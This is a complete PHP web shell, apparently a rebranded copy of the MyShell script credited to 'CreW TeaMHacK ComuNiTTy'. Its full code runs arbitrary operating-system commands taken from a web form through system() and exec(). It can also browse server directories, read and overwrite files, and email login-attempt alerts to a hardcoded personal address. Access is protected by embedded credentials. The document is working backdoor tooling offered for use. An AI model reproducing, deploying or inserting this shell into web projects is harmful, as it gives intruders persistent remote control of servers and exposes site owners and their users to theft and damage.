<?php

$selfSecure = 3;
$shellUser  = "teamhack";
$shellPswd  = "pasutri";
$adminEmail = "shofihr@gmail.com";
$fromEmail  = $HTTP_SERVER_VARS["SERVER_ADMIN"];
$dirLimit = "";
$autoErrorTrap = 1;
$voidCommands  = array("top","xterm","su","vi","pico","netscape");
$TexEd  = "pico";
$editWrap ="wrap='OFF'";

$termCols     = 80;            //Default width of the output text area
$termRows     = 20;            //Default heght of the output text area
$bgColor      = "#000000";     //background color
$bgInputColor = "#008080";     //color of the input field
$outColor     = "#FFFFFF";     //color of the text output from the server
$textColor    = "#F0F0F0";     //color of the hard texts of the terminal
$linkColor    = "#00FFFF";     //color of the links


$MyShellVersion = "CreW TeaMHacK ComuNiTTy";
if ($command&&get_magic_quotes_gpc())$command=stripslashes($command);
if($selfSecure){
    if (($PHP_AUTH_USER!=$shellUser)||($PHP_AUTH_PW!=$shellPswd)) {
       Header('WWW-Authenticate: Basic realm="CreW TeaMHacK ComuNiTTy"');
       Header('HTTP/1.0 401 Unauthorized');
       echo "<html>
         <head>
         <title>$MyShellVersion - Access Denied</title>
         </head>
         <h1>Access denied</h1>
         A warning message have been sended to the administrator
         <hr>
         <em>$MyShellVersion</em>";
       if(isset($PHP_AUTH_USER)){
          $warnMsg ="
 This is $MyShellVersion
 installed on: http://".$HTTP_SERVER_VARS["HTTP_HOST"]."$PHP_SELF
 just to let you know that somebody tryed to access
 the script using wrong username or password:

 Date: ".date("Y-m-d H:i:s")."
 IP: ".$HTTP_SERVER_VARS["REMOTE_ADDR"]."
 User Agent: ".$HTTP_SERVER_VARS["HTTP_USER_AGENT"]."
 username used: $PHP_AUTH_USER
 password used: $PHP_AUTH_PW

 If this is not the first time it happens,
 please consider either to remove MyShell
 from your system or change it's name or
 directory location on your server.

 Regards
 The MyShell dev team
       ";
          mail($adminEmail,"MyShell Warning - Unauthorized Access",$warnMsg,
          "From: $fromEmail\nX-Mailer:$MyShellVersion AutoWarn System");
       }
       exit;
    }
}
//Function that validate directories
function validate_dir($dir){
    GLOBAL $dirLimit;
    if($dirLimit){
        $cdPos = strpos($dir,$dirLimit);
        if ((string)$cdPos == "") {
            $dir = $dirLimit;
            $GLOBALS["shellOutput"] = "You are not allowed change to directories above $dirLimit\n";
        }
    }
    return $dir;
}

// Set working directory.
if (isset($work_dir)) {

  //A workdir has been asked for - we chdir to that dir.
  $work_dir = validate_dir($work_dir);
  @chdir($work_dir) or
      ($shellOutput = "MyShell: can't change directory. Permission denied\nSwitching back to $DOCUMENT_ROOT\n");
  $work_dir = exec("pwd");
}
else{
  // No work_dir - we chdir to $DOCUMENT_ROOT
  $work_dir = validate_dir($DOCUMENT_ROOT);
  chdir($work_dir);
  $work_dir = exec("pwd");
}

//Now we handle files if we are in Edit Mode
if($editMode && ($command||$editCancel))$editMode=false;
if($editMode){
    if($editSave ||$editSaveExit){
        if(function_exists(ini_set))ini_set("track_errors","1");
        if($fp=@fopen($file,"w")){
           if(get_magic_quotes_gpc())$shellOut=stripslashes($shellOut);
           fputs($fp,$shellOut);
           fclose($fp);
           $command = $TexEd." ".$file;
           if($editSaveExit) {
               $command="";
               $shellOutput="MyShell: $file: saved";
               $editMode=false;
           }
       }
       else {
           $command="";
           $shellOutput="MyShell: Error while saving $file:\n$php_errormsg\nUse back button to recover your changes.";
           $errorSave=true;
       }
    }
}

//Separate command(s) and arguments to analize first command
$input=explode(" ",$command);

while (list ($key, $val) = each ($voidCommands)) {
    if($input[0]==$val){
        $voidCmd = $input[0];
        $input[0]="void";
    }
}
switch($input[0]){
    case "cd":
       $path=$input[1];
       if ($path==".."){
         $work_dir=strrev(substr(strstr(strrev($work_dir), "/"), 1));
         if ($work_dir == "") $work_dir = "/";
       }
       elseif (substr($path,0,1)=="/")$work_dir=$path;
       else $work_dir=$work_dir."/".$path;
       $work_dir = validate_dir($work_dir);
       @chdir($work_dir) or ($shellOutput = "MyShell: can't change directory.\n$work_dir: does not exist or permission denied");
       $work_dir = exec("pwd");
       $commandBk = $command;
       $command = "";
       break;
    case "man":
       exec($command,$man);
       if($man){
           $codes = ".".chr(8);
           $manual = implode("\n",$man);
           $shellOutput = ereg_replace($codes,"",$manual);
           $commandBk = $command;
           $command = "";
       }
       else $stderr=1;
       break;
    case "cat":
       exec($command,$cat);
       if($cat){
           $text = implode("\n",$cat);
           $shellOutput = htmlspecialchars($text);
           $commandBk = $command;
           $command = "";
       }
       else $stderr=1;
       break;
    case "more":
       exec($command,$cat);
       if($cat){
           $text = implode("\n",$cat);
           $shellOutput = htmlspecialchars($text);
           $commandBk = $command;
           $command = "";
       }
       else $stderr=1;
       break;
    case $TexEd:
       if(file_exists($input[1])){
           exec("cat ".$input[1],$cat);
           $text = implode("\n",$cat);
           $shellOutput = htmlspecialchars($text);
           $fileOwner = posix_getpwuid(fileowner($input[1]));
           $filePerms = sprintf("%o", (fileperms($input[1])) & 0777);
           $fileEditInfo = "&nbsp;&nbsp;:::::::&nbsp;&nbsp;Owner: <font color=$linkColor>".$fileOwner["name"]."</font> Permissions: <font color=$linkColor>$filePerms</font>";
       }
       else $fileEditInfo = "&nbsp;&nbsp;:::::::&nbsp;&nbsp;<font color=$linkColor>NEW FILE</font>";
       $currFile = $input[1];
       $editMode = true;
       $command = "";
       break;
    case "void":
       $shellOutput = "MyShell: $voidCmd: void command for MyShell";
       $commandBk = $command;
       $command = "";
}

//Now we prepare the webpage
if(!$oCols)$oCols=$termCols;
if(!$oRows)$oRows=$termRows;
if($editMode)$focus="shellOut.focus()";
else $focus="command.select()";
//WhoamI
if(!$whoami)$whoami=exec("whoami");
?>
<html>
<head>
<title><?echo $MyShellVersion?></title>
<style>
body{
background-color: <?echo $bgColor ?>;
font-family : sans-serif;
font-size : 10px;
scrollbar-face-color: #009999;
scrollbar-shadow-color:  <?echo $bgColor ?>;
scrollbar-highlight-color: #999999;
scrollbar-3dlight-color:  <?echo $bgColor ?>;
scrollbar-darkshadow-color:  <?echo $bgColor ?>;
scrollbar-track-color:  <?echo $bgInputColor ?>;
scrollbar-arrow-color:  <?echo $textColor ?>;
}
input,select,option{
background-color: <?echo $bgInputColor ?>;
color : <?echo $outColor ?>;
border-style : none;
font-size : 10px;
}
textarea{
background-color: <?echo $bgColor ?>;
color : <?echo $outColor ?>;
border-style : none;
}
</style>
</head>
<body <?echo "bgcolor=$bgColor TEXT=$textColor LINK=$linkColor VLINK=$linkColor onload=document.shell.$focus"?>>
<form name="shell" method="post">
Current User: <a href="#" style="text-decoration:none"><?echo $whoami?></a>
<input type="hidden" name=whoami value=<?echo $whoami?>>
&nbsp;&nbsp;:::::::&nbsp;&nbsp;
<?
if($editMode){
    echo "<font color=$linkColor><b>MyShell file editor</font> File:<font color=$linkColor>$work_dir/$currFile </font></b>$fileEditInfo\n";
}
else{
    echo "Current working directory: <b>\n";
    $work_dir_splitted = explode("/", substr($work_dir, 1));
    echo "<a href=\"$PHP_SELF?work_dir=" . urlencode($url) . "/&command=" . urlencode($command) . "\">Root</a>/";
    if ($work_dir_splitted[0] == "") {
       $work_dir = "/";  /* Root directory. */
    }
    else{
        for ($i = 0; $i < count($work_dir_splitted); $i++) {
            $url .= "/".$work_dir_splitted[$i];
            echo "<a href=\"$PHP_SELF?work_dir=" . urlencode($url) . "&command=" . urlencode($command) . "\">$work_dir_splitted[$i]</a>/</b>";
        }
    }
}
?>
<br>
<textarea name="shellOut" cols="<? echo $oCols ?>" rows="<? echo $oRows."\""; if(!$editMode)echo "readonly";else echo $editWrap?> >
<?
echo $shellOutput;
if ($command) {
  if ($stderr) {
    system($command . " 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/output.txt");
  }
  else {
    $ok = system($command,$status);
    if($ok==false &&$status && $autoErrorTrap)system($command . " 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/output.txt");
  }
}
if ($commandBk) $command = $commandBk;
?>
</textarea>
<br>
<?
if($editMode) echo"
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
 <input type='submit' name='editSave' value='     Save     '>&nbsp;&nbsp;&nbsp;
 <input type='submit' name='editSaveExit' value=' Save and Exit '>&nbsp;&nbsp;&nbsp;
 <input type='reset' value=' Restore original '>&nbsp;&nbsp;&nbsp;
 <input type='submit' name='editCancel' value=' Cancel/Exit '>&nbsp;&nbsp;&nbsp;
 <input type='hidden' name='editMode' value='true'>
<br>";
?>
<br>
Command:
<input type="text" name="command" size="80"
<? if ($command && $echoCommand) {
     echo "value=`$command`";
   }
?> > <input name="submit_btn" type="submit" value="Go!">
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<?
if ($autoErrorTrap) echo "Auto error traping enabled";
else echo "<input type=\"checkbox\" name=\"stderr\">stderr-traping ";

if($editMode){
    echo "<input type='hidden' name='work_dir' value='$work_dir'>
    <br>Save file as: <input type='text' name='file' value='$currFile'>";
}
else{
    echo "<br>Working directory: <select name=\"work_dir\" onChange=\"this.form.submit()\">";
    // List of directories.
    $dir_handle = opendir($work_dir);
    while ($dir = readdir($dir_handle)) {
      if (is_dir($dir)) {
        if ($dir == ".")
          echo "<option value=\"$work_dir\" selected>Current Directory</option>\n";
        elseif ($dir == "..") {
          // Parent Dir. This might be server's root directory
          if (strlen($work_dir) == 1) {
            // work_dir is only 1 charecter - it can only be / so don't output anything
          }
          elseif (strrpos($work_dir, "/") == 0) {  // we have a top-level directory eg. /bin or /home etc...
            echo "<option value=\"/\">Parent Directory</option>\n";
          }
          else {   // String-manipulation to find the parent directory... Trust me - it works :-)
            echo "<option value=\"". strrev(substr(strstr(strrev($work_dir), "/"), 1)) ."\">Parent Directory</option>\n";
          }
        }
        else {
          if ($work_dir == "/")
            echo "<option value=\"$work_dir$dir\">$dir</option>\n";
          else
            echo "<option value=\"$work_dir/$dir\">$dir</option>\n";
        }
      }
    }
    closedir($dir_handle);
    echo "</select>";
}
?>
&nbsp; | &nbsp;<input type="checkbox" name="echoCommand"<?if($echoCommand)echo " checked"?>>Echo commands
&nbsp; | &nbsp;Cols:<input type="text" name="oCols" size=3 value=<?echo $oCols?>>
&nbsp;Rows:<input type="text" name="oRows" size=2 value=<?echo $oRows?>>
&nbsp;| ::::::::::&nbsp;<b>&copy; CreW TeaMHacK ComuNiTTy</b>&nbsp;:::::::::: |</a>
</form>
</body>
</html>